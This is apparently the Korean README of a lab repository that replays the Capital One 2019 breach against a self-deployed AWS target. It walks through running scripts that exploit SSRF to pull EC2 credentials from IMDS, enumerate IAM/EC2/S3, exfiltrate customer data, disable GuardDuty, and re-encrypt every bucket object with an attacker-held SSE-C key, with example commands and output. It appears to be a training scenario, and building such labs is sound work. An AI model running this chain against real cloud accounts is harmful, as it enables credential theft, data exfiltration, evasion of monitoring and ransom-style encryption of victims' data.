# Cloud9 Attack Chain

Capital One 2019 침해 사고를 재현하는 5단계 공격 시나리오.

```
SSRF → IMDS 자격증명 탈취 → 정찰 → 데이터 유출 → 탐지 회피 → SSE-C 재암호화
```

---

## 사전 준비

### 1. 의존 패키지 설치

```bash
pip install -r attack/requirements.txt
```

### 2. 설정 파일 수정

**`attack/config.py`**에서 아래 두 항목을 실제 값으로 교체한다.

| 변수 | 설명 | 확인 방법 |
|---|---|---|
| `WEBAPP_URL` | 웹앱 엔드포인트 | `terraform output alb_dns_name` 또는 Route53 도메인 |
| `TARGET_BUCKET` | 공격 대상 S3 버킷명 | `terraform output bucket_id` |

### 3. IAM User 자격증명 설정 (Step 4~5용)

Step 3에서 유출한 `config.json`의 `SecretAccessKey`는 더미값이다.  
실제 IAM User 자격증명을 `attack/.env`에 기입한다.

```bash
cp attack/.env.example attack/.env
# .env 파일을 열어 실제 값 입력
```

```dotenv
IAM_ACCESS_KEY_ID=AKIA...
IAM_SECRET_ACCESS_KEY=xxxx
IAM_USER_NAME=WHS-Scenario-Persistence-User
```

> `.env`는 `.gitignore`에 등록되어 있으므로 커밋되지 않는다.

---

## 전체 실행

모든 단계를 순서대로 자동 실행한다.

```bash
# 기본 실행 (config.py 설정값 사용)
python attack/run_all.py

# URL·버킷을 직접 지정
python attack/run_all.py \
    --webapp-url https://whs4namu.click \
    --bucket cloud9-attack-target-a1b2c3d4

# IMDS 우회 페이로드를 무작위로 섞어서 시도 (WAF 로그 다양화)
python attack/run_all.py --payload-mode random
```

### 특정 단계부터 재개

이전 단계가 이미 성공한 경우 `--start-step`으로 중간 단계부터 시작할 수 있다.

```bash
# Step 3부터 재개 (임시 자격증명 주입 필요)
python attack/run_all.py \
    --start-step 3 \
    --inject-access-key ASIA... \
    --inject-secret-key wJalr... \
    --inject-token IQoJb...

# Step 4부터 재개 (임시 자격증명 + IAM User 자격증명 주입 필요)
python attack/run_all.py \
    --start-step 4 \
    --inject-access-key ASIA... \
    --inject-secret-key wJalr... \
    --inject-token IQoJb... \
    --inject-iam-access-key AKIA... \
    --inject-iam-secret-key xxxx
```

---

## 단계별 실행

각 단계를 독립적으로 실행할 수 있다. `attack/` 디렉터리를 기준으로 실행한다.

```bash
cd attack
```

### Step 1 — Initial Access & Credential Access

SSRF 취약점(`GET /preview?url=`)을 통해 IMDS에 접근하고 EC2 임시 자격증명을 탈취한다.

```bash
python step1_initial_access.py

# 웹앱 URL 직접 지정
python step1_initial_access.py --webapp-url https://whs4namu.click

# IMDS 우회 페이로드 무작위 모드
python step1_initial_access.py --payload-mode random
```

**출력 예시:**
```json
{
  "role_name": "cloud9-infra-attack-ec2-role",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalr...",
  "Token": "IQoJb...",
  "Expiration": "2026-09-06T12:00:00Z"
}
```

---

### Step 2 — Discovery (정찰)

탈취한 임시 자격증명으로 IAM 정책, EC2 인스턴스, S3 버킷 목록을 수집한다.

```bash
python step2_discovery.py \
    --access-key ASIA... \
    --secret-key wJalr... \
    --token IQoJb...

# IAM Role 이름 직접 지정 (기본값: cloud9-infra-attack-ec2-role)
python step2_discovery.py \
    --access-key ASIA... \
    --secret-key wJalr... \
    --token IQoJb... \
    --role-name cloud9-infra-attack-ec2-role
```

**수집 항목:**
- IAM: Role에 연결된 관리형·인라인 정책 문서
- EC2: 인스턴스 목록, IAM 프로파일 연결 정보
- S3: 전체 버킷 목록, `cloud9-attack-target` 접두사 버킷의 객체 목록

---

### Step 3 — Exfiltration (데이터 유출)

target 버킷에서 민감 파일을 로컬(`attack/exfiltrated/`)로 다운로드한다.

```bash
python step3_exfiltration.py \
    --access-key ASIA... \
    --secret-key wJalr... \
    --token IQoJb... \
    --bucket cloud9-attack-target-a1b2c3d4
```

**유출 파일:**

| 파일 | 내용 |
|---|---|
| `customers.csv` | 고객 개인정보 |
| `config.json` | IAM User 자격증명 (Step 4~5용) |
| `flag.txt` | 시나리오 플래그 |

> 다운로드된 파일은 `attack/exfiltrated/`에 저장된다.

---

### Step 4 — Defense Evasion (탐지 회피)

`config.json`에서 획득한 IAM User 자격증명으로 GuardDuty 탐지기를 비활성화한다.

```bash
# .env 파일에 자격증명이 있는 경우
python step4_defense_evasion.py

# 인자로 직접 지정
python step4_defense_evasion.py \
    --iam-access-key AKIA... \
    --iam-secret-key xxxx
```

---

### Step 5 — Impact (SSE-C 재암호화)

target 버킷의 모든 객체를 공격자 소유 키로 SSE-C 재암호화한다.  
키 없이는 복호화가 불가능하다.

```bash
# .env 파일에 자격증명이 있는 경우
python step5_impact.py --bucket cloud9-attack-target-a1b2c3d4

# 인자로 직접 지정
python step5_impact.py \
    --iam-access-key AKIA... \
    --iam-secret-key xxxx \
    --bucket cloud9-attack-target-a1b2c3d4
```

**실행 순서:**
1. 32바이트 AES 키 생성 → `attack/exfiltrated/sse_c.key` 저장
2. 버킷 암호화 설정에서 SSE-C 차단 여부 확인 및 해제
3. 버킷 내 전체 객체를 SSE-C 헤더로 자기 자신에게 복사(재업로드)

> 생성된 키 파일을 분실하면 복호화 불가. `attack/exfiltrated/sse_c.key`를 보관할 것.

---

## 파일 구조

```
attack/
├── config.py               # 공통 설정 (수정 필요)
├── imds_payloads.py        # IMDS 우회 페이로드 목록
├── run_all.py              # 전체 체인 실행 엔트리포인트
├── step1_initial_access.py # SSRF → IMDS 자격증명 탈취
├── step2_discovery.py      # IAM·EC2·S3 정찰
├── step3_exfiltration.py   # S3 데이터 유출
├── step4_defense_evasion.py# GuardDuty 비활성화
├── step5_impact.py         # SSE-C 재암호화
├── .env.example            # IAM User 자격증명 템플릿
├── .env                    # 실제 자격증명 (gitignore)
├── requirements.txt        # Python 의존 패키지
└── exfiltrated/            # 유출 파일 저장 디렉터리 (자동 생성)
    ├── customers.csv
    ├── config.json
    ├── flag.txt
    └── sse_c.key
```

---

## 로그

`run_all.py`로 전체 실행 시 `attack/attack_chain.log`에 전체 로그가 기록된다.  
단계별 단독 실행 시에는 표준 출력으로만 확인 가능하다.
